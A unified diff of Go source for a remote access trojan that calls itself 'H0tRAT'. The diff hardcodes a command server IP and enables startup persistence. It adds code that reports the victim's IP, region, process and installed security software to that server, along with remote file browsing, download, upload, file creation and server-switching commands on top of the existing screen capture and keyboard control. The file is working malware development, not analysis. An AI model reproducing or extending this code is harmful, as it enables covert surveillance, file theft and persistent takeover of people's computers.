@@ -4,15 +4,16 @@ import (
 	"bufio"
 	"bytes"
 	"fmt"
+	"github.com/go-ini/ini"
 	"github.com/go-vgo/robotgo"
 	"golang.org/x/sys/windows/registry"
 	"image/jpeg"
+	"io"
 	"log"
 	"net"
 	"os"
 	"path/filepath"
 	"runtime"
-	"strconv"
 	"sync"
 	"time"
 	"ylc/src/demo/MyConst"
@@ -20,20 +21,28 @@ import (
 )
 
 const (
-	IP = "selectbyylc.e3.luyouxia.net:13869"
+	//IP = "selectbyylc.e3.luyouxia.net:13869"
+
+	//IP = "localhost:1011"
+	IP = "209.209.49.184:1011"
 )
 
 const (
 	VERSION = "1.0.0"
 )
 
+type Config struct {
+	IP string
+}
+
+var outputStream io.Writer
 var isturn = true
 var stopScreen bool
 var wg sync.WaitGroup
 
 func Ma() {
 
-	connectNew()
+	连接()
 
 }
 
@@ -42,7 +51,7 @@ func heartbeat(conn net.Conn) {
 		err := util.SendHead(byte(util.HEART), conn)
 		if err != nil {
 			fmt.Println("心跳丢失===》连接断开")
-			connectNew()
+			连接()
 			return
 		}
 		fmt.Println("连接了==========")
@@ -50,43 +59,66 @@ func heartbeat(conn net.Conn) {
 	}
 	wg.Done() // 协程计数器加-1
 }
+func loadConfig() (*Config, error) {
+	cfg, err := ini.Load("config.ini")
+	if err != nil {
+		log.Fatal("Fail to read file: ", err)
+	}
 
-func connectNew() {
+	config := &Config{
+		IP: cfg.Section("IpAndPort").Key("IP").String(),
+	}
+
+	return config, nil
+}
+func 连接() {
+	//config, err := loadConfig()
+	//if err != nil {
+	//	fmt.Println("Failed to load config:", err)
+	//	return
+	//}
+
 	wg.Add(3) // 协程计数器 +1
-	ipEncryptPath, err := util.EncryptString("ylcworld19990709", IP)
-	ipDecryptPath, err := util.DecryptString("ylcworld19990709", ipEncryptPath)
-	//go AddToStartup()
-	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", ipDecryptPath)
+
+	go AddToStartup()
+	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", IP)
 
 	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
+	fmt.Println(socket)
 	if err != nil {
 		fmt.Println(err)
-		connectNew()
+		连接()
 		return
 	}
 	defer socket.Close()
 	//// IO流
 	dataOutputStream := bufio.NewWriter(socket)
+	ip := util.GetIP()
+	region := util.GetRegion(ip)
 
-	// 发送信息
+	name, err := util.GetCurrentGoProgramName()
+	pid := util.GetCurrentPID()
+
+	software := util.GetSecuritySoftware()
+
 	fmt.Fprintln(dataOutputStream, "H0tRAT")
 	fmt.Fprintln(dataOutputStream, "USER")
 	fmt.Fprintln(dataOutputStream, "HOSTNAME")
 	fmt.Fprintln(dataOutputStream, runtime.GOOS)
-	fmt.Fprintln(dataOutputStream, IP)
-	fmt.Fprintln(dataOutputStream, "测试地址")
-	fmt.Fprintln(dataOutputStream, "测试名字")
-	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
+	fmt.Fprintln(dataOutputStream, ip)
+	fmt.Fprintln(dataOutputStream, region)
+	fmt.Fprintln(dataOutputStream, name)
+	fmt.Fprintln(dataOutputStream, pid)
 	fmt.Fprintln(dataOutputStream, "测试")
 	fmt.Fprintln(dataOutputStream, VERSION)
-	fmt.Fprintln(dataOutputStream, "360")
+	fmt.Fprintln(dataOutputStream, software)
 
 	dataOutputStream.Flush()
-	//协程计数器加-1
+
 	go doSomeThing(socket)
 	go heartbeat(socket)
 
-	wg.Wait() //等待协程计数器为0 退出
+	wg.Wait()
 	fmt.Println("abc========================")
 
 }
@@ -96,9 +128,9 @@ func createScreen(socket net.Conn) {
 
 	util.SendHead(1, socket)
 	for {
-		time.Sleep(time.Millisecond * 100)
+		time.Sleep(time.Millisecond * 150)
 
-		screen, err := CaptureScreenAsJPEG(10)
+		screen, err := CaptureScreenAsJPEG(8)
 		if err != nil {
 			fmt.Println(err)
 		}
@@ -189,6 +221,40 @@ func doSomeThing(socket net.Conn) {
 			length := util.ReceiveLength(reader)
 			context, _ := util.ReceiveContext(reader, length)
 			util.KeyReleased(string(context))
+		case string(MyConst.SHOW_FILEWINDOW):
+			util.SendFileWindow(socket)
+		case string(MyConst.FILE_QUERY):
+			length := util.ReceiveLength(reader)
+			context, _ := util.ReceiveContext(reader, length)
+			util.FileQuery(socket, string(context))
+		case string(MyConst.DISK_QUERT):
+			util.DiskQuery(socket)
+		case string(MyConst.FILE_OPEN):
+			length := util.ReceiveLength(reader)
+			context, _ := util.ReceiveContext(reader, length)
+			util.OpenFile(string(context))
+		case string(MyConst.FILE_DOWNLOAD):
+			length := util.ReceiveLength(reader)
+			context, _ := util.ReceiveContext(reader, length)
+			go util.FileDownload(string(context), socket)
+		case string(MyConst.FILE_CREATEWITHNAME):
+			length := util.ReceiveLength(reader)
+			context, _ := util.ReceiveContext(reader, length)
+			util.CreateFile(string(context))
+		case string(MyConst.FILE_PREPARE):
+			util.PrepareFile()
+		case string(MyConst.FILE_UPLOAD):
+			length := util.ReceiveLength(reader)
+			context, _ := util.ReceiveContext(reader, length)
+			util.FileUpload(string(context))
+		case string(MyConst.FILE_UPLOAD_END):
+			length := util.ReceiveLength(reader)
+			context, _ := util.ReceiveContext(reader, length)
+			util.CloseFile(socket, string(context))
+		case string(MyConst.LOAD_NEWHOST):
+			length := util.ReceiveLength(reader)
+			context, _ := util.ReceiveContext(reader, length)
+			util.UpdateConfigFile(string(context))
 		}
 
 	}
